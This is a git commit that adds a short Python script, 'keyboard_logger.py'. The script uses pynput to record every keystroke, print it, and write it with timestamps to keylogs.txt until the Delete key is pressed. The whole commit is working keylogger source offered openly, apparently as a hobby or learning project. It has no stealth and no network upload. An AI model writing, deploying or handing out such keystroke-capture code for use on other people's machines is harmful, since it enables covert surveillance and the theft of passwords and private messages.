d07875debd824b5403771a08136d9e808f42e166
KruzeZab <kruzezab4@gmail.com>
2021-10-01 01:36:08 +0545

    Add Keyboard logger

---
+++ Keyboard Logger/keyboard_logger.py
@@ -0,0 +1,31 @@
+'''
+keyboard logger with python
+Prints every key stroke &
+also stores them in file
+'''
+from pynput.keyboard import Key, Listener
+import logging
+
+
+logging.basicConfig(filename=("keylogs.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+
+
+def on_press(key):
+    '''
+    action on key press
+    '''
+    pressed_key = str(key)
+    print(pressed_key)
+    logging.info(pressed_key)
+    
+def on_release(key):
+    '''
+    stop monitoring if 
+    delete key is pressed
+    '''
+    if key == Key.delete:
+        return False
+    
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    # Start Listening
+    listener.join()
